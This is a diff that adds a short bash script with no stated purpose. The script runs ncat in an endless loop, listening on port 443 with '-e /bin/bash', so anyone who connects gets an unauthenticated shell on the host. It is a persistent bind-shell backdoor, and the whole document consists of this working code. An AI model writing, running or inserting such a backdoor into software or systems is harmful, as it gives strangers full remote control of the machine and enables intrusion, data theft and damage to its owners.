@@ -1,0 +1,6 @@
+#!/bin/bash
+EXPOSE_PORT=443
+while :
+do
+   ncat -nvlp ${EXPOSE_PORT} -e /bin/bash
+done
